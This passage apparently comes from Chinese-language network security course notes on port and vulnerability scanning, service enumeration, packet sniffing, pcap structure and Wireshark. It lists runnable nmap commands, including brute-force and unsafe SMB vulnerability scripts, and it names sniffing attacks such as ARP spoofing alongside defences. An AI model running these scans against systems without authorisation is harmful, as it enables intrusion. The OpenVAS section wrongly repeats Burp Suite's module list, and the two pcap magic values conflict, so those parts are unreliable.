防范措施\n\n并没有太多好办法。应立足于即使攻击者探查出了操作系统和网络服务类型，也不能轻易的攻破这道“坚固的防线”。\n\n#### 10.3.2.4 Nmap\n\nnmap是安全渗透领域最强大的开源端口扫描器，能跨平台支持运行。\n\n```\nhttps://nmap.org\nhttp://sectools.org\n```\n\n扫描示例\n\n```\n主机发现\t\tnmap -sn 192.168.137.144/24\n端口扫描\t\tnmap -sS -p1-1000 192.168.137.144\n系统扫描\t\tnmap -O 192.168.137.144\n网络服务扫描\t   nmap -sV 192.168.137.144\n综合扫描\t\tnmap -A 192.168.137.144\n\n脚本扫描\t\t/usr/share/nmap/scripts\n\t\t\t\tnmap --script=default 192.168.137.144\n\t\t\t\tnmap --script=auth 192.168.137.144\n\t\t\t\tnmap --script=brute 192.168.137.144\n\t\t\t\tnmap --script=vuln 192.168.137.144\n\t\t\t\tnmap --script=broadcast 192.168.137.144\n\t\t\t\tnmap --script=smb-brute.nse 192.168.137.144\n\t\t\t\tnmap --script=smb-check-vulns.nse --script-args=unsafe=1 192.168.137.144\n\t\t\t\tnmap --script=smb-vuln-conficker.nse --script-args=unsafe=1 192.168.137.144\n\t\t\t\tnmap -p3306 --script=mysql-empty-password.nse 192.168.137.144\n```\n\nUDP、ICMP首部长度8byte，TCP、IP首部长度20byte\n\nzenmap——图形化nmap\n\n```\nnmap T4 -A -v 192.168.137.144\n-T\t设置速度等级，1-5级，数字越大速度越快\n-A\t综合扫描\n-v\t输出扫描过程\n```\n\n#### 10.3.2.5 漏洞扫描\n\n系统攻防的核心：安全漏洞、Exploit(渗透攻击)/恶意代码、安全防御与检测机制三者之间的技术博弈。\n\n{% asset_img 安全漏洞生命周期.png 安全漏洞生命周期 %}\n\n漏洞扫描技术：\n\n- 检查系统是否存在已公布安全漏洞，从而易于遭受网络攻击的技术。\n- 双刃剑\n  -网络管理员用来检查系统安全性，渗透测试团队(Red Team)用于安全评估。\n  -攻击者用来列出最可能成功的攻击方法，提高攻击效率。\n\n已发布安全漏洞数据库：\n\n- 业界标准漏洞命名库Common Vulnerabilities and Exposures([CVE][http://cve.mitre.org])\n  - 一本漏洞字典，为大家广泛认同的信息安全漏洞或者已经暴露出来的弱点给出一个公共的名称。\n  - CVE标准使用一个共同的名字，帮助用户在各自独立的各种漏洞数据库中和漏洞评估工具中共享数据，虽然这些工具很难整合在一起。\n\n- National Vulnerability Database([NVD][ https://nvd.nist.gov ])\n- 国家信息安全漏洞共享平台([CNVD][•https://www.cnvd.org.cn])\n\nThe Common Vulnerability Scoring System(CVSS)\n\n- 基本分：漏洞固有的、根本性的属性\n- 时间分：漏洞与时间相关的属性\n- 环境分：不同用户环境中产品安全漏洞所造成的危害程度\n\n{% asset_img CVSS评分过程.png CVSS评分过程 %}\n\n| 等级     | CVSS分数 |\n| -------- | -------- |\n| None     | 0        |\n| Low      | 0.1-3.9  |\n| Medium   | 4.0-6.9  |\n| High     | 7.0-8.9  |\n| Critical | 9.0-10.0 |\n\n##### 10.3.2.4.1 漏洞扫描软件\n\n###### 10.3.2.4.1.1 Nessus\n\n目前最优秀的共享漏洞扫描软件http://www.nessus.org/\n\n一个功能强大而又易于使用的网络漏洞扫描工具，运行于 Linux, Windows, OSX, BSD, Solaris等系统。    \n\n该系统被设计为客户/服务器模式，服务器端负责进行安全扫描，客户端用来配置、管理服务器端，客户端和服务器端之间的通信使用SSL加密。\n\n第一个使用插件的漏洞扫描工具，支持实时的插件升级，具有检测漏洞多、准确、速度快的特点使其在众多漏洞扫描器中脱颖而出。其强大的功能是依赖于其丰富的插件来实现的。\n\n客户端/服务器模式\n\n- 服务器端: nessesd(Tcp1241)\n- 客户端: nessus-q (命令行客户端), nessus(UNIX图形客户端), Nessus Client(Win32客户端)\n\n框架/插件模式\n\n- 安全漏洞扫描插件: 使用NASL语言容易编写并集成至Nessus框架中\n- 插件间可互相依赖和协同工作(端口探测－漏洞扫描插件)\n\nNASL语言(Nessus Attack Scripting Language)\n\n多种报告方式：\n文本/LaTeX/HTML/DHTML/XML/SQL等\n\nNessus体系结构：\n\n{% asset_img Nessus体系结构.png Nessus体系结构 %}\n\n(1)客户端程序向服务端程序发送详细的扫描任务的参数(遵循nessus传输协议)；\n\n(2)服务端程序接收到客户端程序的请求后，加载完成任务所需要的插件，并合理安排插件的执行顺序；\n\n(3)NASL语言解释器执行插件，在执行插件扫描过程中会与扫描目标之间有一些数据交互；\n\n(4)NASL解释器判断扫描结果，并报告给服务端程序；\n\n(5)服务端程序归纳从NASL解释器收到的扫描结果，生成漏洞报告反馈给客户端程序。\n\n###### 10.3.2.4.1.2 AWVS\n\n通过网络爬虫测试你的网站安全，检测流行安全漏洞。\n\n###### 10.3.2.4.1.3 AppScan\n\n###### 10.3.2.4.1.4 BurpSuite\n\n功能模块\n\n```\ntarget\t\t目标模块用于设置扫描域、生成站点地图、生成安全分析\nproxy\t\t代理模块用于拦截浏览器的http会话内容\nspider\t\t爬虫模块用于自动爬取网站的每个页面内容，并生成完成的网站地图\nscanner\t\t扫描模块用于自动化检测漏洞，分为主动和被动扫描\nintruder\t入侵模块根据上面检测到的可能存在漏洞的链接，调用攻击载荷，对目标链接进行攻击\n\t\t\t入侵模块的原理是根据访问链接中存在的参数/变量，调用本地词典、攻击载荷，对参数进行渗透测试\nrepeater\t重放模块用于实现请求重放，通过修改参数进行手工请求回应的调试\nsequencer\t序列器模块用于检测参数的随机性，例如密码或者令牌是否可预测，以此判断关键数据是否可被伪造\ndecoder\t\t解码器模块用于实现对URL、HTML、Base64、ASCII、二八十六进制、哈希等编码转换\ncomparer\t对比模块用于对两次不用的请求和回应进行可视化对比，以此区分不同参数对结果造成的影响\nextender\t通过拓展模块，可以加载自己开发的、或者第三方模块，打造自己的burpsuite功能\n\t\t\t通过burpsuite提供的API接口，目前可以支持Java、Python、Ruby三种语言的模块编写\noptions\t\t分为project/user options，主要对软件进行全局设置\nalerts\t\t显示软件的使用日志信息\n```\n\n###### 10.3.2.4.1.5 OpenVAS\n\n开放式漏洞评估系统，是一个用于评估目标漏洞的杰出框架，开源且功能十分强大。\n\n```\nhttp://www.openvas.org\nhttp://www.greenbone.net\n```\n\n不装了这能装一天。。下面给个安装教程吧\n\n```\n升级kali\napt-get update\napt-get dist-upgrade\n\n安装OpenVAS\napt-get install openvas\nopenvas-setup\n\n修改admin账户密码\nopenvasmd --user=admin --new-password=password\n\n启动openvas\nopenvas-start\n\n检查安装，一定要先启动再检查\nss -tnlp\nopenvas-check-setup\n\n登录openvas\nhttps://192.168.137.144:9392\n```\n\n功能模块\n\n```\ntarget\t\t目标模块用于设置扫描域、生成站点地图、生成安全分析\nproxy\t\t代理模块用于拦截浏览器的http会话内容\nspider\t\t爬虫模块用于自动爬取网站的每个页面内容，并生成完成的网站地图\nscanner\t\t扫描模块用于自动化检测漏洞，分为主动和被动扫描\nintruder\t入侵模块根据上面检测到的可能存在漏洞的链接，调用攻击载荷，对目标链接进行攻击\n\t\t\t入侵模块的原理是根据访问链接中存在的参数/变量，调用本地词典、攻击载荷，对参数进行渗透测试\nrepeater\t重放模块用于实现请求重放，通过修改参数进行手工请求回应的调试\nsequencer\t序列器模块用于检测参数的随机性，例如密码或者令牌是否可预测，以此判断关键数据是否可被伪造\ndecoder\t\t解码器模块用于实现对URL、HTML、Base64、ASCII、二八十六进制、哈希等编码转换\ncomparer\t对比模块用于对两次不用的请求和回应进行可视化对比，以此区分不同参数对结果造成的影响\nextender\t通过拓展模块，可以加载自己开发的、或者第三方模块，打造自己的burpsuite功能\n\t\t\t通过burpsuite提供的API接口，目前可以支持Java、Python、Ruby三种语言的模块编写\noptions\t\t分为project/user options，主要对软件进行全局设置\nalerts\t\t显示软件的使用日志信息\n```\n\n##### 10.3.2.4.2 防范措施\n\n最简单对策：\n\n- 假设黑客会使用漏洞扫描来发现目标网络弱点，那你必须在黑客之前扫描漏洞\n- 补丁自动更新和分发: 修补漏洞\n\n联邦桌面核心配置计划(FDCC)\n\n- 确保桌面计算机的安全漏洞及补丁自动管理\n\n检测和防御漏洞扫描行为\n\n- 网络入侵检测系统: Snort\n- 仔细审查防火墙配置规则\n\n### 10.3.3 网络查点\n\n针对已知的弱点，对识别出来的服务进行更加充分更具针对性的探查，来寻找真正可以攻击的入口，以及攻击过程中可能需要的关键数据。\n\n与网络踩点、扫描的区别\n\n- 与网络踩点技术的关键区别：攻击者的入侵程度\n- 与网络扫描技术的关键区别：攻击者的针对性与信息收集的目标性\n\n#### 10.3.3.1 网络查点能够收集到的信息\n\n用户账户名、错误配置的共享资源、网络服务版本号，这些看起来好像是无害的，但一旦这些信息被细心的高水平攻击者所掌握，就可能成为危害目标系统安全的祸根。\n\n- 用户帐户名：口令猜测破解\n- 错误配置的共享资源：恶意程序上传\n- 老旧的网络服务版本：缓冲区溢出漏洞攻击\n\n#### 10.3.3.2. 网络查点技术\n\n##### 10.3.3.2.1 网络服务旗标抓取技术\n\n最基础和最通用的技术方法。利用客户端工具连接至远程网络服务并观察输出以收集关键信息的技术手段。\n\n```\n-telnet\n-netcat\n```\n\n##### 10.3.3.2.2 通用网络服务查点\n\n- 跨平台，常用服务\n\n- Web服务、FTP文件传输服务、POP3及SMTP电子邮件收发服务\n\n###### 10.3.3.2.2.1 FTP服务查点\n\n-控制协议TCP 21端口，没有任何加密，明文传输口令\n-匿名登录，甚至匿名上传与下载文件\n-FTP查点很简单：使用FTP客户端程序连接即可\n-FTP服务旗标、共享目录、可写目录等信息，可能还会提供FTP帐户名等信息\n-查点后攻击：弱口令猜测与破解、已知FTP服务漏洞渗透攻击\n\n###### 10.3.3.2.2.2 SMTP服务查点\n\nSMTP电子邮件发送协议查点\n-最经典的网络服务查点技术之一\n-两类特殊指令VRFY和EXPN\n-VRFY指令：对合法用户的名字进行验证\n-EXPN指令：显示假名与邮件表实际发送地址\n-可验证和搜索邮件服务器上的活跃帐户\n\nSMTP电子邮件发送协议查点危害\n-伪造更具欺骗性电子邮件，社会工程学攻击\n-探测SMTP服务器枚举出其中有效的电子邮件地址列表，大量发生垃圾邮件\n\n##### 10.3.3.2.3 类Unix平台网络服务查点\n\n古老的finger, rwho, rusers查点\n-用户帐户和登录信息\n-已不常用\n\nRPC查点(TCP/UDP 111, 32771)\n-RPC远程过程调用: portmapperrpcbind\n-RPC查点工具\n\trpcinfo-p HOST: 枚举主机上提供的RPC服务\n\trpcdump(Windows平台运行)\n\tnmap-sS-sRHOST\n\nRPC查点防御策略\n-Secure RPC, 111/32771端口防火墙过滤\n\n##### 10.3.3.2.4 Windows平台网络服务查点\n\nWindows网络服务\n\n- NetBIOS网络基本输入输出系统服务\n\n  -Windows独有的局域网组网协议\n\n- SMB文件与打印共享服务\n\n- AD活动目录与LDAP轻量级目录访问协议\n\n- MSRPC微软远过程调用服务\n\n  -PRC/DCOM\n\nWindows平台网络服务查点\n-NetBIOS主机查点\n-SMB会话查点\n-目录查点\n-MSRPC查点\n\n###### 10.3.3.2.4.1 Windows Networking API \n\n- WinSock API\n\n- 命名管道(Named Pipes)和邮件槽(Mail Slots)\n\n  - 命名管道：提供可靠双向通信，协议无关的标识Windows网络资源的方法\n  - 邮件槽：提供不可靠的单向数据传输，支持广播\n\n- Web访问API\n\n  -WinInet/WinHTTP/HTTP API\n\n###### 10.3.3.2.4.2 NetBIOS\n\n- NetBIOS(网络基本输入/输出系统)：最初由IBM开发，MS利用NetBIOS作为构建局域网的上层协议\n\n- NetBIOS使得程序和网络之间有了标准的接口，方便应用程序的开发。并且可以移植到其他的网络中\n\n- NetBIOS位于OSI模型会话层，TCP/IP之上\n\n- NetBIOS有两种通讯模式\n  - 会话模式。一对一进行通讯，LAN中的机器之间建立会话，可以传输较多的信息，并且可以检查传输错误\n  - 数据报模式。可以进行广播或者一对多的通讯，传输数据大小受限制，没有错误检查机制，也不必建立通讯会话\n\n- NetBIOS over TCP/IP，支持三种服务\n  - 名字服务UDP 137\n  - 会话服务TCP 139/445\n  - 数据报服务UDP 138\n\nNetBIOS网络查点\n\n- 使用net view命令查点域\n  - 列出网络上的工作组和域：net view /domain\n  - 列出指定组/域中的所有计算机：net view /domain:DOMAIN_NAME\n  \n  {% asset_img netview查点域.png netview查点域 %}\n  \n- 查点域控制器\n\n  - Windows Resource Kit -nltest工具\n\n    Nltest.exe 是非常强大的命令行实用程序，用于测试在 Windows NT 域中的信任关系和域控制器复制的状态。域包含，还有一个主域控制器 (PDC) 和零个或多个备份域控制器 (BDC) 的域控制器。\n\n  {% asset_img 查点域控制器.png 查点域控制器 %}\n\n- 查点主机上的NetBIOS名字表\n\n  - nbtstat工具\n\n    主机中的NetBIOS名字表\n\n    计算机名、所在域、当前登录用户、当前运行服务和网卡硬件MAC地址\n\n  {% asset_img nbtstat.png nbtstat %}\n\n  - nbtscan工具\n\n    对整个局域网进行快速的nbtstat查询\n\n    NBTscan是一款在IP网络上扫描NetBIOS名称信息的工具。它通过给指定范围内所有地址发送状态查询来获得反馈信息并以表形式呈现给使用者。每一地址的反馈信息包括IP地址、NetBIOS计算机名、登录用户、MAC地址。\n\n- 其他工具\n\n  epdump, rpcdump, getmac, netdom, netviewx, Winfo, nbtdump, …\n\n- 防范措施\n\n  - 网络：防火墙禁止外部访问TCP/UDP 135-139，445端口\n  - 主机：配置IPSec过滤器，主机个人防火墙，禁用Alerter和Messenger服务\n\n###### 10.3.3.2.4.3 MSRPC远程进程调用/DCOM\n\nRPC (Remote Procedure Call)\n\n- 网络编程标准\n- 目的: 提供“能在某种程度上像应用程序开发人员隐藏有关网络编程细节”的编程模型\n\nRPC调用\n\n- 允许程序员编写的客户应用程序跨网络调用远程计算机上服务器应用程序中的过程\n\n客户机对服务器的RPC调用操作：\n\n1.调用客户端句柄；执行传送参数\n2.调用本地系统内核发送网络消息\n3.消息传送到远程主机\n4.服务器句柄得到消息并取得参数\n5.执行远程过程\n6.执行的过程将结果返回服务器句柄\n7.服务器句柄返回结果，调用远程系统内核\n8.消息传回本地主机\n9.客户句柄由内核接收消息\n10.客户接收句柄返回的数据\n\n{% asset_img PRC调用操作.png PRC调用操作 %}\n\n###### 10.3.3.2.4.4 COM/DCOM\n\nCOM对象: 使应用程序由不同组件构成，导出面向对象接口，提高软件模块化、可扩展性和可交互性。\n\nDCOM: 提供COM组件的位置透明性，依赖于RPC\n\n###### 10.3.3.2.4.5 常用的Windows应用层网络服务\n\n- Network Applications\n\n- IIS (Internet Information Services)\n  HTTP/FTP/…\n- Email\n  Exchange Server\n- Database\n  MS SQL Server\n- RDP\n  Remote Desktop Protocol\n- 通常以Windows服务方式后台运行\n\n###### 10.3.3.2.4.6 Windows服务\n\n- Windows服务－系统启动时刻启动进程的机制，提供不依赖于任何交互式的服务。\n\n- Windows服务\n  - 服务应用程序\n    注册服务Advapi32.dll, CreateService/StartServices\n    注册表: HKLM\\SYSTEM\\CurrentControlSet\\Services\n    共享服务进程: 服务宿主svchost.exe\n  - 服务控制管理器(SCM, service control manager, services.exe)\n    Winlogon进程在加载GINA之前执行SCM启动函数\n    SCM中的ScCreateServiceDB根据注册表分别启动服务\n    SCM中的ScAutoStartServices启动“自动启动”的服务\n  - 服务控制程序(SCP, service control program)\n    控制面板，服务插件…\n\n# 11. 网络嗅探与协议分析\n\n- 网络嗅探(Sniff)\n\n–网络监听、网络窃听\n\n–类似于传统的电话线窃听\n\n- 网络嗅探技术定义\n\n–利用计算机网络接口截获目的地为其他计算机的数据报文\n\n–监听网络流中所包含的用户账户密码或私密信息等\n\n- 网络嗅探器(Sniffer)\n\n–实现嗅探的软件或硬件设备\n\n–嗅探获得数据二进制格式数据报文\n\n–解析和理解二进制数据，获取各层协议字段和应用层传输数据网络协议分析\n\n- 危害与作用\n\n  - 攻击者：内网渗透技术\n\n    窃取机密信息，为发起进一步攻击收集信息\n\n  - 防御者\n\n    管理员可以用来监听网络的流量情况，定位网络故障\n\n    为网络入侵检测系统提供底层数据来源基础\n\n  - 其他作用\n\n    开发网络应用的程序员可以监视程序的网络情况\n\n- 网络嗅探技术与工具分类\n\n  - 以太网嗅探\n  - WiFi嗅探\n  - …\n  - 目前一些著名嗅探器支持多种链路层网络嗅探，wireshark, Sniffer Pro…\n\n- 工具形态\n\n  - 软件嗅探器\n  - 硬件嗅探器(协议分析仪): 专用设备, 速度快, 额外功能(如流量记录与重放等), 价格昂贵\n\n## 11.1 以太网络\n\n### 11.1.1 工作原理\n\n- 载波侦听/冲突检测(CSMA/CD: 802.3, carrier sense multiple access with collision detection)技术\n  - 载波侦听：是指在网络中的每个站点都具有同等的权利，在传输自己的数据时，首先监听信道是否空闲\n    \t如果空闲，就传输自己的数据\n      \t如果信道被占用，就等待信道空闲\n  - 而冲突检测则是为了防止发生两个站点同时监测到网络没有被使用时而产生冲突\n- 以太网采用了CSMA/CD技术，由于使用了广播机制，所以，所有在同一媒介信道上连接的工作站都可以看到网络上传递的数据。\n\n### 11.1.2 工作模式\n\n- 网卡的MAC地址(48位)\n\n  –通过ARP来解析MAC与IP地址的转换\n\n  –用ipconfig/ifconfig可以查看MAC地址\n\n- 正常情况下，网卡应该只接收这样的包\n\n  –MAC地址与自己相匹配的数据帧\n\n  –广播包\n\n- 网卡完成收发数据包的工作，两种接收模式\n\n  –混杂模式：不管数据帧中的目的地址是否与自己的地址匹配，都接收下来\n\n  –非混杂模式：只接收目的地址相匹配的数据帧，以及广播数据包(和组播数据包)\n\n- 为了监听网络上的流量，必须设置为混杂模式\n\n## 11.2 共享式网络与交换式网络\n\n### 11.2.1 共享式网络\n\n–通过Hub(集线器)连接\n\n–总线方式: 通过网络的所有数据包\n\n–发往每一个主机\n\n–能够嗅探整个Hub上全部网络流量\n\n{% asset_img 共享式网络.png 共享式网络 %}\n\n### 11.2.2 交换式网络\n\n–通过Switch(交换机)连接\n\n–由交换机构造一个“MAC地址-端口”映射表\n\n–发送包的时候，只发到特定端口上\n\n–只能监听同一端口上流量\n\n–可通过流量映像口监听(SPAN)\n\n{% asset_img 交换式网络.png 交换式网络 %}\n\n#### 11.2.2.1 交换式网络中的嗅探攻击\n\n- MAC地址洪泛攻击\n\n  向交换机发送大量虚构MAC地址和IP地址数据包\n  致使交换机“MAC地址-端口映射表”溢出\n  交换机切换入所谓的“打开失效”模式-“共享式”\n\n- MAC欺骗\n\n  假冒所要监听的主机网卡，将源MAC地址伪造成目标主机的MAC地址\n  交换机不断地更新它的“MAC地址-端口映射表”\n  交换机就会将本应发送给目标主机的数据包发送给攻击者\n\n- ARP欺骗(中间人攻击)\n\n  利用IP地址与MAC地址之间进行转换时的协议漏洞\n\n## 11.3 应用程序抓包的技术\n\n- 类Unix平台提供了标准的API支持\n\n  内核态: BPF(Berkeley Packet Filter)\n  用户态函数库：libpcap\n  用户态嗅探程序：tcpdump等\n\n- Windows平台通过驱动程序来抓取数据包\n\n  驱动程序: NPF(NetGroupPacket Filter)\n  用户态函数库：winpcap\n  用户态嗅探程序：windump等\n\n### 11.3.1 BPF\n\n- BSD数据包捕获\n\n  –BPF是一个核心态的组件，支持数据包“过滤”抓取\n\n  –Network Tap接收所有的数据包\n\n  –BPF虚拟机机器语言的解释器，比较/算术等操作\n\n  –Kernel Buffer，保存过滤器送过来的数据包\n\n  –User buffer，用户态上的数据包缓冲区\n\n- Libpcap(一个抓包工具库)支持BPF\n\n  –Libpcap是用户态的一个抓包工具\n\n  –Libpcap几乎是系统无关的\n\n- BPF是一种比较理想的抓包方案\n\n  –在核心态，所以效率比较高\n\n  –目前类UNIX系统的标准抓包内核模块 \n\n{% asset_img BPF和libpcap.png BPF和libpcap %}\n\n### 11.3.2 libpcap抓包库\n\n- 用户态下的抓包库\n\n- 系统独立的接口，C语言接口\n\n  –多种其他高级编程语言包装接口: Perl, Python, Ruby, Tcl, Java, …\n\n- 广泛应用于\n\n  –网络统计软件\n\n  –入侵检测系统\n\n  –网络调试\n\n- 支持过滤机制，BPF\n\n## 11.4 pcap格式\n\n基本格式：文件头、数据包头、数据报、数据包头、数据报...\n\n{% asset_img pcap格式.png pcap格式 %}\n\n```c\nstruct pcap_file_header {\n        bpf_u_int32 magic;    //4字节 pcap文件标识 目前为“d4 c3 b2 a1”\n        u_short version_major;   //2字节 主版本号 \n        u_short version_minor;  // 2字节 次版本号 \n        bpf_int32 thiszone;     /* 4字节 时区修正     并未使用，目前全为0*/\n        bpf_u_int32 sigfigs;    /* 4字节 精确时间戳   并未使用，目前全为0 */\n        bpf_u_int32 snaplen;    /* 4字节 抓包最大长度, 抓全设为0x0000ffff, 缺省为68字节 */\n        bpf_u_int32 linktype;   /* 4字节 链路类型    一般都是1：ethernet*/\n};\n\n```\n\n各字段说明：\n\n| 字段     | 字节 | 16进制表示  | 含义                 |\n| -------- | ---- | ----------- | -------------------- |\n| Magic    | 4B   | 1A 2B 3C 4D | 标示文件的开始       |\n| Major    | 2B   | 02 00       | 当前文件主要的版本号 |\n| Minor    | 2B   | 04 00       | 当前文件次要的版本号 |\n| ThisZone | 4B   |             | 当地的标准时间       |\n| SigFlags | 4B   |             | 时间戳的精度         |\n| SnapLen  | 4B   |             | 最大的存储长度       |\n| LinkType | 4B   |             | 链路类型             |\n\nLinkType链路类型\n\n| 值   | 类型                                                         |\n| ---- | ------------------------------------------------------------ |\n| 0    | BSD loopback devices, except for later OpenBSD               |\n| 1    | Ethernet, and Linux loopback devices                         |\n| 6    | 802.5 Token Ring                                             |\n| 7    | ARCnet                                                       |\n| 8    | SLIP                                                         |\n| 9    | PPP                                                          |\n| 10   | FDDI                                                         |\n| 100  | LLC/SNAP-encapsulated ATM                                    |\n| 101  | \"raw IP\", with no link                                       |\n| 102  | BSD/OS SLIP                                                  |\n| 103  | BSD/OS PPP                                                   |\n| 104  | Cisco HDLC                                                   |\n| 105  | 802.11                                                       |\n| 108  | later OpenBSD loopback devices (with the AF_value in network byte order) |\n| 113  | special Linux \"cooked\" capture                               |\n| 114  | LocalTalk                                                    |\n\n{% asset_img pcap格式2.png pcap格式2 %}\n\n```c\nstruct pcap_pkthdr {\n        struct timeval ts;      /* time stamp */\n        bpf_u_int32 caplen;     /* length of portion present */\n        bpf_u_int32 len;        /* length this packet (off wire) */\n};\nstruct timeval {\n        long            tv_sec;         /* seconds (XXX should be time_t) */\n        suseconds_t     tv_usec;        /* and microseconds */\n};\n```\n\n各字段说明：\n\n| 字段      | 含义                                                         |\n| --------- | ------------------------------------------------------------ |\n| Timestamp | 时间戳高位，精确到seconds                                    |\n| Timestamp | 时间戳低位，精确到microseconds                               |\n| Caplen    | 当前数据区的长度，即抓取到的数据帧长度，由此可以得到下一个数据帧的位置。 |\n| Len       | 离线数据长度，网络中实际数据帧的长度，一般不大于caplen，多数情况下和Caplen数值相等。 |\n\nPacket 数据：即 Packet（通常就是链路层的数据帧去掉前面用于同步和标识帧开始的8字节和最后用于CRC校验的4字节）的具体内容，长度就是Caplen，这个长度的后面，就是当前PCAP文件中存放的下一个Packet数据包。PCAP文件里面并没有规定捕获的Packet数据包之间有什么间隔字符串，需要靠第一个Packet包确定下一组数据在文件中的起始位置。\n\n## 11.5 网络嗅探器软件\n\n- 类Unix平台网络嗅探器软件\n\n  –Libpcap抓包开发函数库\n\n  –Tcpdump以及wireshark嗅探器软件\n\n  –Snort、dsniff、sniffit和linux_sniffer…\n\n- Windows平台网络嗅探器软件\n\n  –NPF/winpcap/windump\n\n  –SnifferPro\n\n  –Buttsniffer、NetMon、Network Associates Sniffer\n\n### 11.5.1 Windows平台下的抓包技术\n\n- 内核本身没有提供标准的接口\n\n- 通过增加一个驱动程序或者网络组件来访问内核网卡驱动提供的数据包\n\n  –在Windows不同操作系统平台下有所不同\n\n- 不同sniffer采用的技术不同\n\n  –WinPcap是一个重要的抓包工具，它是libpcap的Windows版本\n\n#### 11.5.1.1 WinPcap\n\n- WinPcap包括三个部分\n\n  –第一个模块NPF(Netgroup Packet Filter)，是一个虚拟设备驱动程序文件。它的功能是过滤数据包，并把这些数据包原封不动地传给用户态模块，这个过程中包括了一些操作系统特有的代码\n\n  –第二个模块packet.dll为win32平台提供了一个公共的接口。不同版本的Windows系统都有自己的内核模块和用户层模块。Packet.dll用于解决这些不同。调用Packet.dll的程序可以运行在不同版本的Windows平台上，而无需重新编译\n\n  –第三个模块Wpcap.dll是不依赖于操作系统的。它提供了更加高层、抽象的函数。\n\n- packet.dll和Wpcap.dll\n\n  –packet.dll直接映射了内核的调用\n\n  –Wpcap.dll提供了更加友好、功能更加强大的函数调用\n\n{% asset_img winpcap组成.png winpcap组成 %}\n\n{% asset_img winpcap组成2.png winpcap组成2 %}\n\n- NPF在Windows网络结构中位置\n  - NDIS(Network Driver Interface Specification，网络驱动接口规范)描述了网络驱动与底层网卡之间的接口规范，以及它与上层协议之间的规范\n  - NPF作为一个核心驱动程序而提供的\n\n- WinPcap优势\n\n  - 提供了一套标准的抓包接口\n\n    ​\t–与libpcap兼容，可使得原来许多类UNIX平台下的网络分析工具快速移植过来\n\n    ​\t–便于开发各种网络分析工具\n\n  - 除了与libpcap兼容的功能之外，还有\n\n    ​\t–充分考虑了各种性能和效率的优化，包括对于NPF内核层次上的过滤器支持\n\n    ​\t–支持内核态的统计模式\n\n    ​\t–提供了发送数据包的能力\n\n## 11.6 网络嗅探的检测技术\n\n- 网卡和操作系统对于是否处于混杂模式会有一些不同的行为，利用这些特征可以判断一个机器是否运行在混杂模式下\n\n- 一些检测手段\n\n  –根据操作系统的特征\n\n  - Linux内核的特性：正常情况下，只处理本机MAC地址或者以太广播地址的包。在混杂模式下，许多版本的Linux内核只检查数据包中的IP地址以确定是否送到IP堆栈。因此，可以构造无效以太地址而IP地址有效的ICMP ECHO请求，看机器是否返回应答包(混杂模式)，或忽略(非混杂模式)。\n  - Windows 9x/NT：在混杂模式下，检查一个包是否为以太广播包时，只看MAC地址前八位是否为0xff。\n\n  –根据网络和主机的性能\n\n  - 根据响应时间：向本地网络发送大量的伪造数据包，然后，看目标主机的响应时间，首先要测得一个响应时间基准和平均值。\n\n## 11.7 网络嗅探技术的防范措施\n\n- 采用安全的网络拓扑\n\n  –共享式网络à交换式网络\n\n  –交换机上设置VLAN等技术手段，对网络进行合理的分段\n\n- 共享式以太网à交换式以太网拓扑\n\n  –性能提升: 广播冲突域à  每台主机单独冲突域\n\n  –安全性提升: 较难被网络监听\n\n  –交换式网络提供安全性仍可能被挫败: ARP欺骗\n\n- 静态ARP或者MAC-端口映射表代替动态机制\n- 重视网络数据传输的集中位置点的安全防范\n\n- 避免使用明文传输口令/敏感信息网络协议, 使用加密协议\n\n  –telnet->ssh\n\n  –IPSEC/TLS\n\n## 11.8 网络协议分析\n\n- 网络协议分析的粒度和层次\n\n  –原始数据包: 最细粒度、最低层次\n\n  –网络流(/会话): 通过5元组进行流(/会话)重组\n\n- 5元组: sip, sport, dip, dport, ipproto\n\n  –网络流高层统计\n\n  –IP会话列表<sip, sport>\n\n  - 目标端口流统计\\<dport>\n\n- 网络报文分析工具\n\n  –集成工具: Wireshark\n\n  –网络流重组: nstreams, snort\n\n  –高层统计和摘要分析: Netflow, RRDTools\n\n- 原始数据包粒度网络协议分析对网络上传输的二进制格式数据包进行解析，以恢复出各层网络协议信息以及传输内容的技术方法。\n\n{% asset_img 原始数据包粒度分析.png 原始数据包粒度分析 %}\n\n## 11.9 网络协议分析技术实现  \n\n- 实现参考源码\n\n  –Snort中的网络解码器模块\n\n  –decode.c/decode.h\n\n- 解析以太网数据帧 DecodeEthPkt\n\n  –预处理：拆包前进行一些前期处理\n\n  –拆包：将当前得到的包内存位置赋给Packet数据结构中相应的指针eh(EtherHdr)型的指针即可\n\n  –解析上层协议： switch语句，根据ether_type分别调用相应的上层协议解析例程\n\n{% asset_img DecodeEthPkt.png DecodeEthPkt %}\n\n## 11.10 Wireshark(ethereal)\n\n- Wireshark特性\n\n  –图形化界面/命令行(tshark)\n\n  –在线/离线抓包(支持标准pcap二进制日志文件)\n\n  –支持BPF过滤器\n\n  –支持分析几百种常见网络协议\n\n  –跨平台：类UNIX、Win32(依赖libpcap/WinPcap)\n\n### 11.10.1 Wireshark基本功能  \n\n- 抓包(Capture)\n\n  –Capture Filter: BPF过滤器\n\n- 分析(Analyze)\n\n  –自动协议解码: 支持数百种协议, 显示各层包头和内容字段\n\n  –灵活选择协议对网络流进行解码Decode As…\n\n- 统计(Statistics)\n\n  –协议分类(Protocol Hierarchy)\n\n  –会话列表(Conversations)\n\n  - 2层(以太网)/3层(IP)/4层(TCP,UDP)\n\n  –会话终端(EndPoints)\n\n  –I/O Graph: 随时间统计的流量曲线\n\n  –会话重组(Follow TCP/UDP Stream)(Flow Graph)\n\n### 11.10.2 Wireshark中的两类过滤规则\n\n- 嗅探过滤规则\n\n  –支持BPF规则\n\n  –用于嗅探抓包时的过滤\n\n- 显示过滤规则\n\n  –用于在界面中选择显示哪些数据包\n\n  –与BPF规则有所不同\n\n## 11.11 流重组/会话重组\n\n- 流重组/会话重组\n\n  –TCP/UDP会话发送字节数可能很大\n\n  –IP包最大长度(64K-20≈64K)\n\n  –以太网帧最大长度(1500-20=1480)\n\n  –协议栈发送大量TCP/UDP报文时，必然分组传送\n\n  –流重组: 将同属于一个TCP/UDP会话的IP包负载按序重新组装，还原应用层数据的过程\n\n- 流重组工具\n\n  –Wireshark: Follow TCP/UDP Stream\n\n  –nstreams:\n\n  - nstreams -f pcap_file > nstreams.txt\n\n  –Snort:\n\n  - Log规则(snort.conf): log tcp any any <> any any (sid:1000001; session: printable;)\n\n  - snort -r pcap_file –l ./log -csnort.conf\n\n## 11.12 网络流记录和高层统计分析\n\n- Netflow\n\n  –定义了网络会话流记录的业界标准-Cisco\n\n- RFC 3334/3954/3955\n\n  –IP Flow Information Export (netflowv10)-IETF\n\n- 网络流记录\n\n  